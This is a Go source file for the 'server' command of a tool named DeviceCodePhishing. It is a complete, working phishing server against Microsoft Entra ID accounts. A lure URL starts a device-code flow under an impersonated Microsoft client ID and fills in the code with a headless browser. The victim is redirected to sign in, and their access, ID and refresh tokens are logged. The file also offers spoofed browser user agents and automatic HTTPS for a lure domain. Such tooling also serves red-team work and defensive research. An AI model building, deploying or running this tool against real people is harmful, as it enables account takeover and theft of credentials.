package cmd

import (
	"io"
	"log"
	"log/slog"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
	"github.com/spf13/cobra"

	"golang.org/x/crypto/acme/autocert"
)

const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
const MsAuthenticationBroker string = "29d9ed98-a469-4536-ade2-f981bc1d605e"
const DefaultTenant string = "common"

// Predefined user agents (updated to current versions)
var predefinedUserAgents = map[string]string{
	"firefox-android": "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
	"chrome-android":  "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
	"edge-android":    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UQ1A.240105.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 EdgA/131.0.0.0",
	"android-browser": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36",
	"firefox-macos":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:132.0) Gecko/20100101 Firefox/132.0",
	"chrome-macos":    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"edge-macos":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	"safari-macos":    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
	"chrome-desktop":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"ie11":            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"firefox-windows": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
	"edge-legacy":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36 Edg/100.0.1185.50",
	"edge-ios":        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 EdgiOS/131.0.0.0 Mobile/15E148 Safari/605.1.15",
	"chrome-ios":      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.0.0 Mobile/15E148 Safari/604.1",
	"safari-ios":      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
	"firefox-ios":     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/132.0 Mobile/15E148 Safari/605.1.15",
	"firefox-linux":   "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
	"chrome-linux":    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"edge-linux":      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	"brave-linux":     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/131.0.0.0 Safari/537.36",
	"vivaldi-linux":   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Vivaldi/6.5.3206.63",
	"opera-linux":     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/107.0.0.0",
	"chromium-linux":  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/131.0.6778.85 Safari/537.36",
	"konqueror-linux": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) Konqueror/5.0.97 Safari/538.1",
	"firefox-os2":     "Mozilla/5.0 (OS/2; Warp 3.0; i686) AppleWebKit/537.11 (KHTML, like Gecko) Firefox/35.0",
	"seamonkey-os2":   "Mozilla/5.0 (OS/2; Warp 4.52; rv:24.9) Gecko/20100101 Seamonkey/2.33.1",
	"chromplus-os2":   "Mozilla/5.0 (OS/2; Warp 4.5; i686) AppleWebKit/535.3 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/535.3",
	"qt-browser-os2":  "Mozilla/5.0 (OS/2; Warp 4.52; i686; rv:10.0) Gecko/20100101 QtWeb/2.3.2",
	"netfront-os2":    "Mozilla/5.0 (OS/2; Warp 3.0; i686) NetFront/3.4",
}

// Predefined ClientIds
var predefinedClientIds = map[string]string{
	"office365":          "00b41c95-dab0-4487-9791-b9d2c32c80f2", // Office 365 Management
	"azurecli":           "04b07795-8ddb-461a-bbee-02f9e1bf7b46", // Microsoft Azure CLI
	"officeuwa":          "0ec893e0-5785-4de6-99da-4ed124e5296c", // Office UWP PWA
	"msdocs":             "18fbca16-2224-45f6-85b0-f7bf2b39b3f3", // Microsoft Docs
	"azurepowershell":    "1950a258-227b-4e31-a9cf-717495945fc2", // Microsoft Azure PowerShell
	"windowsspotlight":   "1b3c667f-cde3-4090-b60b-3d2abd0117f0", // Windows Spotlight
	"aadpowershell":      "1b730954-1685-4b74-9bfd-dac224a7b894", // Azure Active Directory PowerShell
	"msteams":            "1fec8e78-bce4-4aaf-ab1b-5451cc387264", // Microsoft Teams
	"mstodo":             "22098786-6e16-43cc-a27d-191a1a1e3b5",  // Microsoft To-Do client
	"universalstore":     "268761a2-03f3-40df-8a8b-c3db24145b6b", // Universal Store Native Client
	"winsearch":          "26a7ee05-5602-4d76-a7ba-eae8b7b67941", // Windows Search
	"outlook":            "27922004-5251-4030-b22d-91ecd9a37ea4", // Outlook Mobile
	"msauthbroker":       "29d9ed98-a469-4536-ade2-f981bc1d605e", // Microsoft Authentication Broker
	"bingsearch":         "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8", // Microsoft Bing Search for Microsoft Edge
	"authenticator":      "4813382a-8fa7-425e-ab75-3b753aab3abb", // Microsoft Authenticator App
	"powerapps":          "4e291c71-d680-4d0e-9640-0a3358e31177", // PowerApps
	"whiteboard":         "57336123-6e14-4acc-8dcf-287b6088aa28", // Microsoft Whiteboard Client
	"flow":               "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0", // Microsoft Flow Mobile PROD-GCCH-CN
	"roamingbackup":      "60c8bde5-3167-4f92-8fdb-059f6176dc0f", // Enterprise Roaming and Backup
	"planner":            "66375f6b-983f-4c2c-9701-d680650f588f", // Microsoft Planner
	"stream":             "844cca35-0656-46ce-b636-13f48b0eecbd", // Microsoft Stream Mobile Native
	"visualstudio":       "872cd9fa-d31f-45e0-9eab-6e460a02d1f1", // Visual Studio - Legacy
	"teamsadmin":         "87749df4-7ccf-48f8-aa87-704bad0e0e16", // Microsoft Teams - Device Admin Agent
	"aadrmpowershell":    "90f610bf-206d-4950-b61d-37fa6fd1b224", // Aadrm Admin PowerShell
	"intune":             "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223", // Microsoft Intune Company Portal
	"sporemote":          "9bc3ab49-b65d-410a-85ad-de819febfddc", // Microsoft SharePoint Online Management Shell
	"exchangepowershell": "a0c73c16-a7e3-4564-9a95-2bdf47383716", // Microsoft Exchange Online Remote PowerShell
	"accountcontrol":     "a40d7d7d-59aa-447e-a655-679a4107e548", // Accounts Control UI
	"yammerphone":        "a569458c-7f2b-45cb-bab9-b7dee514d112", // Yammer iPhone
	"onedrive":           "ab9b8c07-8f02-4f72-87fa-80105867a763", // OneDrive Sync Engine
	"onedriveios":        "af124e86-4e96-495a-b70a-90f90ab96707", // OneDrive iOS App
	"ondriveconsumer":    "b26aadf8-566f-4478-926f-589f601d9c74", // OneDrive
	"aadjcsp":            "b90d5b8f-5503-4153-b545-b31cecfaece2", // AADJ CSP
	"powerbi":            "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12", // Microsoft Power BI
	"spoextension":       "c58637bb-e2e1-4312-8a00-04b5ffcd3403", // SharePoint Online Client Extensibility
	"aadconnect":         "cb1056e2-e479-49de-ae31-7812af012ed8", // Microsoft Azure Active Directory Connect
	"bing":               "cf36b471-5b44-428c-9ce7-313bf84528de", // Microsoft Bing Search
	"sharepoint":         "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0", // SharePoint
	"office":             "d3590ed6-52b3-4102-aeff-aad2292ab01c", // Microsoft Office
	"outlooklite":        "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", // Outlook Lite
	"modernedge":         "e9c51622-460d-4d3d-952d-966a5b1da34c", // Microsoft Edge
	"tunnel":             "eb539595-3fe1-474e-9c1d-feb3625d1be5", // Microsoft Tunnel
	"edgemobile":         "ecd6b820-32c2-49b6-98a6-444530e5a77a", // Microsoft Edge
	"spandroid":          "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d", // SharePoint Android
	"dynamics365":        "f448d7e5-e313-4f90-a3eb-5dbb3277e4b3", // Media Recording for Dynamics 365 Sales
	"edgewebview":        "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34", // Microsoft Edge
	"exchangerest":       "fb78d390-0c51-40cd-8e17-fdbfab77341b", // Microsoft Exchange REST API Based PowerShell
	"intuneagent":        "fc0f3af4-6835-4174-b806-f7db311fd2f3", // Microsoft Intune Windows Agent
}

var (
	address         string
	customUserAgent string
	userAgent       string
	clientId        string
	customClientId  string
	tenant          string
	pathPrefix      string
	domain          string
	certFile        string
	keyFile         string
)

func init() {
	rootCmd.AddCommand(runCmd)
	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Server listening address")
	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", "", "Predefined User-Agent to use (see --help for list)")
	runCmd.Flags().StringVar(&customUserAgent, "custom-user-agent", EdgeOnWindows, "Custom User-Agent string")
	runCmd.Flags().StringVarP(&clientId, "client-id", "c", "", "ClientId key to use (see --help for predefined options)")
	runCmd.Flags().StringVar(&customClientId, "custom-client-id", "", "Custom ClientId (full GUID)")
	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Azure tenant to target")
	runCmd.Flags().StringVarP(&pathPrefix, "path", "p", "", "Custom path for the lure URL (e.g., /custom) - default is /lure")
	runCmd.Flags().StringVarP(&domain, "domain", "d", "", "Domain name for automatic HTTPS (uses Let's Encrypt)")
	runCmd.Flags().StringVar(&certFile, "cert", "", "Certificate file for HTTPS (also requires --key)")
	runCmd.Flags().StringVar(&keyFile, "key", "", "Key file for HTTPS (also requires --cert)")
}

var runCmd = &cobra.Command{
	Use:   "server",
	Short: "Starts the phishing server",
	Long: `Starts the phishing server. Listens by default on http://localhost:8080/lure

Available User-Agent options for --user-agent:
  firefox-android        - Firefox on Android
  chrome-android         - Chrome on Android
  edge-android          - Edge on Android
  android-browser       - Default Android browser
  firefox-macos         - Firefox on macOS
  chrome-macos          - Chrome on macOS
  edge-macos            - Edge on macOS
  safari-macos          - Safari on macOS
  chrome-desktop        - Chrome on Windows
  ie11                  - Internet Explorer 11
  firefox-windows       - Firefox on Windows
  edge-legacy           - Legacy Edge on Windows
  edge-ios              - Edge on iOS
  chrome-ios            - Chrome on iOS
  safari-ios            - Safari on iOS
  firefox-ios           - Firefox on iOS
  firefox-linux         - Firefox on Linux
  chrome-linux          - Chrome on Linux
  edge-linux            - Edge on Linux
  brave-linux           - Brave on Linux
  vivaldi-linux         - Vivaldi on Linux
  opera-linux           - Opera on Linux
  chromium-linux        - Chromium on Linux
  konqueror-linux       - Konqueror on Linux
  firefox-os2           - Firefox on OS/2
  seamonkey-os2         - SeaMonkey on OS/2
  chromplus-os2         - ChromePlus on OS/2
  qt-browser-os2        - Qt Browser on OS/2
  netfront-os2          - NetFront on OS/2

Available ClientId options for --client-id:
  msauthbroker          - Microsoft Authentication Broker (default)
  office365             - Office 365 Management
  azurecli              - Microsoft Azure CLI
  officeuwa             - Office UWP PWA
  msdocs                - Microsoft Docs
  azurepowershell       - Microsoft Azure PowerShell
  windowsspotlight      - Windows Spotlight
  aadpowershell         - Azure Active Directory PowerShell
  msteams               - Microsoft Teams
  mstodo                - Microsoft To-Do client
  universalstore        - Universal Store Native Client
  winsearch             - Windows Search
  outlook               - Outlook Mobile
  bingsearch            - Microsoft Bing Search for Microsoft Edge
  authenticator         - Microsoft Authenticator App
  powerapps             - PowerApps
  whiteboard            - Microsoft Whiteboard Client
  flow                  - Microsoft Flow Mobile
  roamingbackup         - Enterprise Roaming and Backup
  planner               - Microsoft Planner
  stream                - Microsoft Stream Mobile Native
  visualstudio          - Visual Studio - Legacy
  teamsadmin            - Microsoft Teams - Device Admin Agent
  aadrmpowershell       - Aadrm Admin PowerShell
  intune                - Microsoft Intune Company Portal
  sporemote             - Microsoft SharePoint Online Management Shell
  exchangepowershell    - Microsoft Exchange Online Remote PowerShell
  accountcontrol        - Accounts Control UI
  yammerphone           - Yammer iPhone
  onedrive              - OneDrive Sync Engine
  onedriveios           - OneDrive iOS App
  ondriveconsumer       - OneDrive (Consumer)
  aadjcsp               - AADJ CSP
  powerbi               - Microsoft Power BI
  spoextension          - SharePoint Online Client Extensibility
  aadconnect            - Microsoft Azure AD Connect
  bing                  - Microsoft Bing Search
  sharepoint            - SharePoint
  office                - Microsoft Office
  outlooklite           - Outlook Lite
  modernedge            - Microsoft Edge (Modern)
  tunnel                - Microsoft Tunnel
  edgemobile            - Microsoft Edge (Mobile)
  spandroid             - SharePoint Android
  dynamics365           - Media Recording for Dynamics 365 Sales
  edgewebview           - Microsoft Edge (WebView)
  exchangerest          - Microsoft Exchange REST API Based PowerShell
  intuneagent           - Microsoft Intune Windows Agent

Examples:
  # Using predefined options
  DeviceCodePhishing server --user-agent chrome-android --client-id msteams
  
  # Using custom ClientId  
  DeviceCodePhishing server --custom-client-id "your-custom-clientid-guid"
  
  # With custom path (URL will be /auth)
  DeviceCodePhishing server --path /auth --client-id azurecli
  
  # With automatic HTTPS (Let's Encrypt) - domain must be valid and pointing to this server
  DeviceCodePhishing server --domain example.com --client-id office365
  
  # With custom SSL certificates
  DeviceCodePhishing server --cert cert.pem --key key.pem --client-id msteams
  
  # HTTPS on custom port
  DeviceCodePhishing server --address :8443 --domain example.com

Note: Cannot specify both --client-id and --custom-client-id simultaneously
Note: Cannot use --domain with --cert/--key (use one SSL method only)
Note: When using --domain, the domain must be properly configured to point to this server's IP`,
	Run: func(cmd *cobra.Command, args []string) {
		// Determine which user agent to use
		finalUserAgent := customUserAgent
		if userAgent != "" {
			if ua, ok := predefinedUserAgents[userAgent]; ok {
				finalUserAgent = ua
			} else {
				slog.Error("Invalid user-agent", "provided", userAgent, "available", strings.Join(getAvailableUserAgents(), ", "))
				os.Exit(1)
			}
		}

		// Determine which ClientId to use
		finalClientId := ""

		// Check if both client-id and custom-client-id are provided
		if clientId != "" && customClientId != "" {
			slog.Error("Cannot specify both --client-id and --custom-client-id",
				"clientId", clientId,
				"customClientId", customClientId)
			os.Exit(1)
		}

		// Use predefined ClientId
		if clientId != "" {
			if cid, ok := predefinedClientIds[clientId]; ok {
				finalClientId = cid
			} else {
				slog.Error("Invalid client-id", "provided", clientId, "available", strings.Join(getAvailableClientIds(), ", "))
				os.Exit(1)
			}
		}

		// Use custom ClientId
		if customClientId != "" {
			finalClientId = customClientId
		}

		// If no ClientId specified, use default
		if finalClientId == "" {
			finalClientId = MsAuthenticationBroker
		}

		// Sanitize path prefix
		if pathPrefix != "" {
			if !strings.HasPrefix(pathPrefix, "/") {
				pathPrefix = "/" + pathPrefix
			}
			pathPrefix = strings.TrimSuffix(pathPrefix, "/")
		}

		// Set up a single resource handler
		lurePath := pathPrefix
		if lurePath == "" {
			lurePath = "/lure"
		}
		http.HandleFunc(lurePath, getLureHandler(finalClientId, finalUserAgent))

		host, port, err := net.SplitHostPort(address)
		if err != nil || port == "" {
			slog.Error("Invalid address format", "address", address, "error", err)
			os.Exit(1)
		}

		// Create a Server instance to listen on port
		server := &http.Server{
			Addr: address,
		}

		// Configure SSL/TLS if requested
		isHTTPS := false
		protocol := "http"
		if domain != "" && (certFile != "" || keyFile != "") {
			slog.Error("Cannot use both --domain and --cert/--key simultaneously")
			os.Exit(1)
		}

		if domain != "" || (certFile != "" && keyFile != "") {
			isHTTPS = true
			protocol = "https"

			// If using Let's Encrypt, typically run on port 443
			if domain != "" && address == ":8080" {
				address = ":443"
				server.Addr = address
				// Re-parse the address
				host, port, err = net.SplitHostPort(address)
				if err != nil || port == "" {
					slog.Error("Invalid address format", "address", address, "error", err)
					os.Exit(1)
				}
			}
		}

		slog.Info("Start Server",
			"tenant", tenant,
			"clientId", finalClientId,
			"userAgent", finalUserAgent)

		if host == "" {
			host = "localhost"
		}

		slog.Info("Lure available at", "url", protocol+"://"+host+":"+port+lurePath)

		// Attempt to get public IP
		publicIP := getPublicIP()
		if publicIP != "" {
			// Use domain name if provided, otherwise use public IP
			if domain != "" {
				slog.Info("Public URL", "url", protocol+"://"+domain+":"+port+lurePath)
			} else {
				slog.Info("Public URL", "url", protocol+"://"+publicIP+":"+port+lurePath)
			}
		}

		if domain != "" {
			slog.Info("Using automatic HTTPS with Let's Encrypt", "domain", domain)
		}

		// Start the server
		if isHTTPS {
			if domain != "" {
				// Use Let's Encrypt for automatic HTTPS
				certManager := autocert.Manager{
					Prompt:     autocert.AcceptTOS,
					HostPolicy: autocert.HostWhitelist(domain),
					Cache:      autocert.DirCache("certs"),
					Email:      "", // Optional: add email for notifications
				}
				server.TLSConfig = certManager.TLSConfig()

				// Add /.well-known/acme-challenge handler for HTTP-01 challenge
				httpServer := &http.Server{
					Addr:    ":80",
					Handler: certManager.HTTPHandler(nil),
				}
				go func() {
					err := httpServer.ListenAndServe()
					if err != nil && err != http.ErrServerClosed {
						slog.Error("Failed to start HTTP server for ACME challenges", "error", err)
					}
				}()

				log.Fatal(server.ListenAndServeTLS("", ""))
			} else {
				// Use custom certificates
				log.Fatal(server.ListenAndServeTLS(certFile, keyFile))
			}
		} else {
			// HTTP only
			log.Fatal(server.ListenAndServe())
		}
	},
}

func getLureHandler(clientId string, userAgent string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		slog.Info("Lure opened", "clientId", clientId, "remoteAddr", r.RemoteAddr)

		http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)

		scopes := []string{"openid", "profile", "offline_access"}
		deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
		if err != nil {
			slog.Error("Error starting device code flow", "error", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent)
		if err != nil {
			slog.Error("Error during headless browser automation", "error", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		go startPollForToken(tenant, clientId, deviceAuth)
		http.Redirect(w, r, redirectUri, http.StatusFound)
	}
}

func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth) {
	pollInterval := time.Duration(deviceAuth.Interval) * time.Second

	for {
		time.Sleep(pollInterval)
		slog.Info("Checking for token", "userCode", deviceAuth.UserCode, "clientId", clientId)
		result, err := entra.RequestToken(tenant, clientId, deviceAuth)

		if err != nil {
			slog.Error("Error requesting token", "error", err)
			return
		}

		if result != nil {
			slog.Info("Token received", "userCode", deviceAuth.UserCode, "clientId", clientId)
			slog.Info("ACCESS TOKEN:", "token", result.AccessToken)
			slog.Info("ID TOKEN:", "token", result.IdToken)
			slog.Info("REFRESH TOKEN:", "token", result.RefreshToken)
			return
		}
	}
}

func getAvailableUserAgents() []string {
	agents := make([]string, 0, len(predefinedUserAgents))
	for key := range predefinedUserAgents {
		agents = append(agents, key)
	}
	return agents
}

func getAvailableClientIds() []string {
	clients := make([]string, 0, len(predefinedClientIds))
	for key := range predefinedClientIds {
		clients = append(clients, key)
	}
	return clients
}

func getPublicIP() string {
	// Try multiple services to get the public IP
	services := []string{
		"https://api.ipify.org",
		"https://checkip.amazonaws.com",
		"https://icanhazip.com",
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	for _, service := range services {
		resp, err := client.Get(service)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}

		ip := strings.TrimSpace(string(body))
		if ip != "" {
			return ip
		}
	}

	return ""
}
